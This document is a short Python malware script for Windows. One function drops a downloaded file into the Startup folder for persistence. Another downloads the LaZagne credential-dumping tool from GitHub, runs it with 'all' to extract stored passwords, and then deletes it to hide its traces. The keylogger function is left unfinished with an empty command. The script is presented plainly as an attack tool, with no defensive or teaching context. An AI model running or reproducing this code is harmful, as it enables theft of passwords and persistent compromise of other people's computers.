#Import Libraries
import requests, subprocess, tempfile, os

#Change Directory to Temp Directory and Download LaZagne.exe and Execute and remove
def keylogger(url):
    os.chdir("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
    get_response = requests.get(url)
    file_name= url.split("/")[-1]
    with open (file_name,"wb") as out_file:
        out_file.write(get_response.content)
    subprocess.run("")


def lazagne(url):
    temp_directory=tempfile.gettempdir()

    os.chdir(temp_directory)
    get_response = requests.get(url)
    file_name= url.split("/")[-1]
    with open (file_name,"wb") as out_file:
        out_file.write(get_response.content)
    result=subprocess.check_output("LaZagne.exe all", shell=True)
    os.remove("LaZagne.exe")
lazagne("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe")


